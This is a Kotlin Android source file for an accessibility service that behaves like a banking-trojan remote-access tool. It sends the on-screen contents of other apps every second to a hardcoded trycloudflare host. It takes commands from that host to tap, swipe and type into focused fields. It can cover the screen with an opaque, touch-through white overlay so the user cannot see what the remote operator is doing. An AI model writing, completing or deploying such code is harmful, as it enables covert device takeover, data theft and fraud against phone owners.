package com.meuacesso.remoto

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Rect
import android.graphics.Path
import kotlin.math.sqrt
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import android.widget.TextView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL


class ControleGestosService : AccessibilityService() {

    companion object {
        const val URL_VPS = "https://tires-noticed-expensive-alloy.trycloudflare.com"
        const val URL_ENVIAR_ESTRUTURA = "${URL_VPS}/receber_esqueleto"
        const val URL_BUSCAR_COMANDOS = "${URL_VPS}/obter_comando"
        const val URL_BUSCAR_OVERLAY = "${URL_VPS}/obter_overlay"

        private const val INTERVALO_ATUALIZACAO = 1000L
        private const val CANAL_NOTIFICACAO = "servico_controle_remoto"
        private const val ID_NOTIFICACAO = 9999
    }

    private var jobPrincipal: Job? = null
    private var overlayView: View? = null
    private var parametrosOverlay: WindowManager.LayoutParams? = null
    private lateinit var windowManager: WindowManager

    private var overlayAtivo = false
    private var mensagemOverlayAtual = ""
    private var textoInferiorOverlayAtual = ""
    private var logoOverlayAtual = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        criarCanalNotificacao()
        iniciarServicoEmPrimeiroPlano()
        iniciarLoopPrincipal()
        Log.i("KL", "Serviço de acessibilidade iniciado")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {
        Log.w("KL", "Acessibilidade interrompida")
    }

    override fun onDestroy() {
        pararServico()
        super.onDestroy()
    }

    private fun iniciarLoopPrincipal() {
        jobPrincipal = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    val estrutura = extrairEstruturaCompleta()
                    enviarEstruturaParaServidor(estrutura)

                    verificarComandosRecebidos()
                    verificarOverlay()

                } catch (e: Exception) {
                    Log.e("KL", "Erro no loop: ${e.message}")
                }
                delay(INTERVALO_ATUALIZACAO)
            }
        }
    }

    // ─── Extração de elementos da tela ───────────────────────────────────────

    /**
     * Returns the root node of the app beneath the overlay.
     * When overlay is active, rootInActiveWindow points to our overlay window —
     * we must read the focused application window instead so the panel keeps working.
     */
    private fun obterRaizAplicativo(): AccessibilityNodeInfo? {
        val janelas = windows
        if (janelas.isNullOrEmpty()) return rootInActiveWindow

        fun ehJanelaOverlay(janela: AccessibilityWindowInfo): Boolean {
            val raiz = janela.root ?: return true
            val pacote = raiz.packageName?.toString() ?: ""
            return pacote == packageName ||
                    janela.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
        }

        val janelasApp = janelas.filter { !ehJanelaOverlay(it) }
        if (janelasApp.isEmpty()) return rootInActiveWindow

        janelasApp.firstOrNull { it.isFocused }?.root?.let { return it }
        janelasApp.firstOrNull { it.isActive }?.root?.let { return it }

        return janelasApp
            .filter { it.type == AccessibilityWindowInfo.TYPE_APPLICATION }
            .maxByOrNull { janela ->
                val area = Rect()
                janela.root?.getBoundsInScreen(area)
                area.width() * area.height()
            }?.root ?: rootInActiveWindow
    }

    private fun extrairEstruturaCompleta(): String {
        val listaElementos = mutableListOf<Map<String, Any>>()
        val idsIncluidos = mutableSetOf<String>()
        val displayMetrics = resources.displayMetrics

        val janelas = windows
        if (!janelas.isNullOrEmpty()) {
            janelas
                .filter { janela ->
                    val raiz = janela.root ?: return@filter false
                    val pacote = raiz.packageName?.toString() ?: ""
                    pacote != packageName &&
                            janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
                }
                .forEach { janela ->
                    janela.root?.let { percorrerNo(it, listaElementos, idsIncluidos) }
                }
        }

        if (listaElementos.isEmpty()) {
            obterRaizAplicativo()?.let { percorrerNo(it, listaElementos, idsIncluidos) }
        }

        return montarJsonEstrutura(listaElementos, displayMetrics)
    }

    private fun montarJsonEstrutura(
        listaElementos: List<Map<String, Any>>,
        displayMetrics: android.util.DisplayMetrics
    ): String {
        val json = org.json.JSONObject().apply {
            put("id", Build.ID)
            put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("fabricante", Build.MANUFACTURER)
            put("android", Build.VERSION.RELEASE)
            put("largura", displayMetrics.widthPixels)
            put("altura", displayMetrics.heightPixels)
            put("densidade", displayMetrics.densityDpi)
        }

        val elementosJson = org.json.JSONArray()
        listaElementos.forEach { elemento ->
            val obj = org.json.JSONObject()
            elemento.forEach { (chave, valor) -> obj.put(chave, valor) }
            elementosJson.put(obj)
        }
        json.put("elementos", elementosJson)
        return json.toString()
    }

    private fun obterTextoDireto(no: AccessibilityNodeInfo): String {
        return no.text?.toString()?.trim().orEmpty()
    }

    private fun obterDescricao(no: AccessibilityNodeInfo): String {
        return no.contentDescription?.toString()?.trim().orEmpty()
    }

    private fun obterDica(no: AccessibilityNodeInfo): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return ""
        return no.hintText?.toString()?.trim().orEmpty()
    }

    private fun obterEstado(no: AccessibilityNodeInfo): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return ""
        return no.stateDescription?.toString()?.trim().orEmpty()
    }

    private fun obterRotuloElemento(no: AccessibilityNodeInfo): String {
        val partes = linkedSetOf<String>()
        obterTextoDireto(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
        obterDescricao(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
        obterDica(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
        obterEstado(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            no.error?.toString()?.trim()?.takeIf { it.isNotEmpty() }?.let { partes.add(it) }
        }
        if (no.isPassword) partes.add("••••")
        return partes.joinToString("\n")
    }

    private fun coletarTextoDescendentes(
        no: AccessibilityNodeInfo,
        profundidadeMax: Int = 5,
        profundidade: Int = 0
    ): String {
        if (profundidade > profundidadeMax) return ""

        val textos = linkedSetOf<String>()
        for (i in 0 until no.childCount) {
            val filho = no.getChild(i) ?: continue
            obterRotuloElemento(filho).takeIf { it.isNotEmpty() }?.let { textos.add(it) }
            coletarTextoDescendentes(filho, profundidadeMax, profundidade + 1)
                .takeIf { it.isNotEmpty() }
                ?.let { textos.add(it) }
            @Suppress("DEPRECATION")
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
        }
        return textos.take(4).joinToString(" | ")
    }

    private fun identificarTipo(className: String, isClickable: Boolean, isEditable: Boolean, isCheckable: Boolean): String {
        return when {
            isEditable || className.contains("EditText", ignoreCase = true) ||
                    className.contains("AutoCompleteTextView", ignoreCase = true) -> "campo_texto"
            className.contains("ImageButton", ignoreCase = true) -> "botao"
            className.contains("Button", ignoreCase = true) ||
                    className.contains("MaterialButton", ignoreCase = true) -> "botao"
            className.contains("CheckBox", ignoreCase = true) ||
                    className.contains("Switch", ignoreCase = true) ||
                    className.contains("ToggleButton", ignoreCase = true) ||
                    className.contains("RadioButton", ignoreCase = true) ||
                    isCheckable -> "selecao"
            className.contains("ImageView", ignoreCase = true) -> "imagem"
            className.contains("WebView", ignoreCase = true) -> "webview"
            className.contains("RecyclerView", ignoreCase = true) ||
                    className.contains("ListView", ignoreCase = true) ||
                    className.contains("GridView", ignoreCase = true) -> "lista"
            className.contains("TextView", ignoreCase = true) ||
                    className.contains("compose", ignoreCase = true) -> "texto"
            isClickable -> "clicavel"
            else -> "outro"
        }
    }

    private fun corPorTipo(tipo: String): String = when (tipo) {
        "campo_texto" -> "#2196F3"
        "botao"       -> "#4CAF50"
        "texto"       -> "#E0E0E0"
        "clicavel"    -> "#FF9800"
        "imagem"      -> "#9C27B0"
        "selecao"     -> "#F44336"
        "lista"       -> "#00BCD4"
        "webview"     -> "#FF5722"
        else          -> "#9E9E9E"
    }

    private fun deveIncluirElemento(
        no: AccessibilityNodeInfo,
        area: Rect,
        rotulo: String,
        className: String,
        isClickable: Boolean,
        isEditable: Boolean
    ): Boolean {
        if (area.width() <= 0 || area.height() <= 0) return false

        if (rotulo.isNotEmpty()) return true

        if (isEditable || isClickable) {
            return area.width() >= 16 && area.height() >= 16
        }

        val classeRelevante = className.contains("Text", ignoreCase = true) ||
                className.contains("Button", ignoreCase = true) ||
                className.contains("Edit", ignoreCase = true) ||
                className.contains("WebView", ignoreCase = true) ||
                className.contains("Recycler", ignoreCase = true) ||
                className.contains("compose", ignoreCase = true)

        return classeRelevante && area.width() >= 8 && area.height() >= 8
    }

    private fun percorrerNo(
        no: AccessibilityNodeInfo,
        listaElementos: MutableList<Map<String, Any>>,
        idsIncluidos: MutableSet<String>
    ) {
        val area = Rect()
        no.getBoundsInScreen(area)

        val className = no.className?.toString() ?: ""
        val isClickable = no.isClickable || no.isLongClickable
        val isEditable = no.isEditable
        val isCheckable = no.isCheckable
        val isPassword = no.isPassword
        val isEnabled = no.isEnabled
        val isChecked = no.isChecked

        val texto = obterTextoDireto(no)
        val descricao = obterDescricao(no)
        val dica = obterDica(no)
        val estado = obterEstado(no)
        val recursoId = no.viewIdResourceName?.substringAfter("/") ?: ""

        var rotulo = obterRotuloElemento(no)
        if (rotulo.isEmpty() && (isClickable || isEditable || no.childCount > 0)) {
            rotulo = coletarTextoDescendentes(no)
        }

        val visivel = no.isVisibleToUser
        val temConteudo = rotulo.isNotEmpty() || descricao.isNotEmpty() || texto.isNotEmpty()

        if ((visivel || temConteudo) && deveIncluirElemento(no, area, rotulo, className, isClickable, isEditable)) {
            val tipo = identificarTipo(className, isClickable, isEditable, isCheckable)
            val textoExibicao = rotulo.ifEmpty { descricao.ifEmpty { dica.ifEmpty { estado.ifEmpty { recursoId } } } }
            val chave = "${area.left}|${area.top}|${area.width()}|${area.height()}|$textoExibicao|$className"

            if (chave !in idsIncluidos) {
                idsIncluidos.add(chave)
                listaElementos.add(
                    mapOf(
                        "tipo"       to tipo,
                        "type"       to tipo,
                        "classe"     to className,
                        "cor"        to corPorTipo(tipo),
                        "rotulo"     to textoExibicao,
                        "label"      to textoExibicao,
                        "texto"      to textoExibicao,
                        "text"       to textoExibicao,
                        "descricao"  to descricao,
                        "dica"       to dica,
                        "estado"     to estado,
                        "recurso_id" to recursoId,
                        "viewId"     to recursoId,
                        "x"          to area.left,
                        "y"          to area.top,
                        "largura"    to area.width(),
                        "altura"     to area.height(),
                        "width"      to area.width(),
                        "height"     to area.height(),
                        "clicavel"   to isClickable,
                        "editavel"   to isEditable,
                        "senha"      to isPassword,
                        "ativo"      to isEnabled,
                        "marcado"    to isChecked
                    )
                )
            }
        }

        for (i in 0 until no.childCount) {
            val filho = no.getChild(i) ?: continue
            percorrerNo(filho, listaElementos, idsIncluidos)
            @Suppress("DEPRECATION")
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
        }
    }

    private fun extrairEstruturaTela(raiz: AccessibilityNodeInfo): String {
        val listaElementos = mutableListOf<Map<String, Any>>()
        val idsIncluidos = mutableSetOf<String>()
        percorrerNo(raiz, listaElementos, idsIncluidos)
        return montarJsonEstrutura(listaElementos, resources.displayMetrics)
    }
    // ─── Comunicação com o servidor ──────────────────────────────────────────

    private fun enviarEstruturaParaServidor(dados: String) {
        CoroutineScope(Dispatchers.IO).launch {
            var conexao: HttpURLConnection? = null
            try {
                conexao = URL(URL_ENVIAR_ESTRUTURA).openConnection() as HttpURLConnection
                conexao.apply {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = 3000
                    readTimeout = 3000
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                }
                OutputStreamWriter(conexao.outputStream, Charsets.UTF_8).use { it.write(dados) }
                val resposta = conexao.responseCode
                if (resposta != HttpURLConnection.HTTP_OK) {
                    Log.w("KL", "Estrutura: servidor retornou $resposta")
                }
            } catch (e: Exception) {
                Log.e("KL", "Erro ao enviar estrutura: ${e.message}")
            } finally {
                conexao?.disconnect()
            }
        }
    }

    private fun verificarComandosRecebidos() {
        var conexao: HttpURLConnection? = null
        try {
            val idDispositivo = Build.ID
            conexao = URL("$URL_BUSCAR_COMANDOS?id=$idDispositivo").openConnection() as HttpURLConnection
            conexao.apply {
                requestMethod = "GET"
                connectTimeout = 2000
                readTimeout = 2000
            }
            if (conexao.responseCode == HttpURLConnection.HTTP_OK) {
                val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
                    .readText().trim()
                if (resposta.isNotEmpty() && resposta != "nenhum") {
                    Log.d("KL", "Comando: $resposta")
                    Handler(Looper.getMainLooper()).post { processarComando(resposta) }
                }
            }
        } catch (e: Exception) {
            Log.e("KL", "Erro ao buscar comando: ${e.message}")
        } finally {
            conexao?.disconnect()
        }
    }

    private fun verificarOverlay() {
        var conexao: HttpURLConnection? = null
        try {
            val idDispositivo = Build.ID
            conexao = URL("$URL_BUSCAR_OVERLAY?id=$idDispositivo").openConnection() as HttpURLConnection
            conexao.apply {
                requestMethod = "GET"
                connectTimeout = 2000
                readTimeout = 2000
            }

            if (conexao.responseCode != HttpURLConnection.HTTP_OK) return

            val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
                .readText().trim()

            if (resposta.isEmpty()) {
                if (overlayAtivo) Handler(Looper.getMainLooper()).post { removerOverlay() }
                return
            }

            val json = org.json.JSONObject(resposta)
            val ativo = json.optBoolean("ativo", false)

            if (!ativo) {
                if (overlayAtivo) Handler(Looper.getMainLooper()).post { removerOverlay() }
                return
            }

            val mensagem = json.optString("mensagem", "Aguarde...")
            val textoInferior = json.optString("texto_inferior", "")
            val logo = json.optString("logo", "")

            Handler(Looper.getMainLooper()).post {
                mostrarOuAtualizarOverlay(mensagem, textoInferior, logo)
            }

        } catch (e: Exception) {
            Log.e("KL", "Erro ao verificar overlay: ${e.message}")
        } finally {
            conexao?.disconnect()
        }
    }

    // ─── Overlay ─────────────────────────────────────────────────────────────

    /**
     * Shows overlay if not visible, or updates content in-place to avoid flicker.
     * Must be called on the main thread.
     */
    private fun mostrarOuAtualizarOverlay(mensagem: String, textoInferior: String, logo: String) {
        if (overlayAtivo && overlayView != null) {
            garantirOverlayNaoBloqueiaToque()

            val changed = mensagem != mensagemOverlayAtual ||
                    textoInferior != textoInferiorOverlayAtual ||
                    logo != logoOverlayAtual
            if (!changed) return

            overlayView!!.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
            overlayView!!.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior
            mensagemOverlayAtual = mensagem
            textoInferiorOverlayAtual = textoInferior
            logoOverlayAtual = logo
            Log.d("KL", "Overlay atualizado sem recriação")
            return
        }

        criarOverlay(mensagem, textoInferior, logo)
    }

    private fun garantirOverlayNaoBloqueiaToque() {
        val view = overlayView ?: return
        val params = parametrosOverlay ?: return

        view.isClickable = false
        view.isFocusable = false
        view.isFocusableInTouchMode = false

        val flagsDesejadas = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED

        if (params.flags != flagsDesejadas) {
            params.flags = flagsDesejadas
            try {
                windowManager.updateViewLayout(view, params)
                parametrosOverlay = params
            } catch (e: Exception) {
                Log.w("KL", "Erro ao atualizar flags do overlay: ${e.message}")
            }
        }
    }

    private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
        if (!Settings.canDrawOverlays(this)) {
            Log.e("KL", "Permissão SYSTEM_ALERT_WINDOW não concedida")
            return
        }

        val tipoJanela = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            tipoJanela,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
            PixelFormat.OPAQUE
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        val view = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null)
        view.setBackgroundColor(Color.WHITE)
        view.isClickable = false
        view.isFocusable = false
        view.isFocusableInTouchMode = false
        view.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
        view.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior

        try {
            windowManager.addView(view, params)
            overlayView = view
            parametrosOverlay = params
            overlayAtivo = true
            mensagemOverlayAtual = mensagem
            textoInferiorOverlayAtual = textoInferior
            logoOverlayAtual = logo
            Log.i("KL", "Overlay criado — $mensagem")
        } catch (e: Exception) {
            Log.e("KL", "Erro ao criar overlay: ${e.message}")
            resetarEstadoOverlay()
        }
    }

    private fun removerOverlay() {
        overlayView?.let { view ->
            try {
                windowManager.removeView(view)
            } catch (e: Exception) {
                Log.w("KL", "Erro ao remover overlay: ${e.message}")
            }
        }
        overlayView = null
        parametrosOverlay = null
        resetarEstadoOverlay()
        Log.i("KL", "Overlay removido")
    }

    private fun resetarEstadoOverlay() {
        overlayAtivo = false
        mensagemOverlayAtual = ""
        textoInferiorOverlayAtual = ""
        logoOverlayAtual = ""
    }

    // ─── Comandos ─────────────────────────────────────────────────────────────

    private fun processarComando(comando: String) {
        val partes = comando.split("|", limit = 2)
        if (partes.isEmpty()) return

        when (partes[0].lowercase().trim()) {
            "toque" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                executarToque(x, y)
            }
            "arrastar" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x1 = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y1 = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                val x2 = coords.getOrNull(2)?.trim()?.toFloatOrNull() ?: return
                val y2 = coords.getOrNull(3)?.trim()?.toFloatOrNull() ?: return
                executarArrasto(x1, y1, x2, y2)
            }
            "rolar" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x1 = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y1 = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                val x2 = coords.getOrNull(2)?.trim()?.toFloatOrNull() ?: return
                val y2 = coords.getOrNull(3)?.trim()?.toFloatOrNull() ?: return
                executarArrasto(x1, y1, x2, y2)
            }
            "voltar"  -> performGlobalAction(GLOBAL_ACTION_BACK)
            "inicio"  -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recentes"-> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "texto"   -> inserirTexto(partes.getOrNull(1) ?: "")
            "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
            "esconder_overlay"-> removerOverlay()
        }
    }

    private fun executarToque(x: Float, y: Float) {
        val caminho = Path().apply { moveTo(x, y) }
        val gesto = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 100L))
            .build()
        dispatchGesture(gesto, null, null)
    }

    private fun executarArrasto(x1: Float, y1: Float, x2: Float, y2: Float) {
        val dx = x2 - x1
        val dy = y2 - y1
        val distancia = sqrt(dx * dx + dy * dy)

        if (distancia < 8f) {
            executarToque(x2, y2)
            return
        }

        val duracao = (distancia * 1.8f).toLong().coerceIn(350L, 1400L)
        val caminho = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        val gesto = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(caminho, 0L, duracao))
            .build()

        Log.d("KL", "Arrasto: ($x1,$y1)->($x2,$y2) dist=$distancia dur=${duracao}ms")
        dispatchGesture(gesto, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                Log.d("KL", "Arrasto concluído")
            }

            override fun onCancelled(gestureDescription: GestureDescription?) {
                Log.w("KL", "Arrasto cancelado")
            }
        }, null)
    }

    private fun inserirTexto(texto: String) {
        if (texto.isBlank()) return

        val raiz = obterRaizAplicativo() ?: run {
            Log.e("KL", "Raiz da tela não encontrada para inserir texto")
            return
        }

        val campoAtivo = raiz.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: raiz.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)

        if (campoAtivo == null) {
            Log.e("KL", "Nenhum campo de entrada em foco")
            raiz.recycle()
            return
        }

        val argumentos = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, texto)
        }
        val sucesso = campoAtivo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, argumentos)
        Log.i("KL", if (sucesso) "Texto inserido com sucesso" else "Falha ao inserir texto")

        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) campoAtivo.recycle()
        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) raiz.recycle()
    }

    // ─── Serviço em primeiro plano ────────────────────────────────────────────

    private fun pararServico() {
        jobPrincipal?.cancel()
        jobPrincipal = null
        Handler(Looper.getMainLooper()).post { removerOverlay() }
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    private fun criarCanalNotificacao() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(
                CANAL_NOTIFICACAO,
                "Controle Remoto",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Mantém o serviço ativo em segundo plano"
            }
            (getSystemService(NotificationManager::class.java))
                .createNotificationChannel(canal)
        }
    }

    private fun iniciarServicoEmPrimeiroPlano() {
        val notificacao = Notification.Builder(this, CANAL_NOTIFICACAO)
            .setContentTitle("KL Acesso Remoto Ativo")
            .setContentText("Monitorando tela e aguardando comandos")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .build()
        startForeground(ID_NOTIFICACAO, notificacao)
    }
}
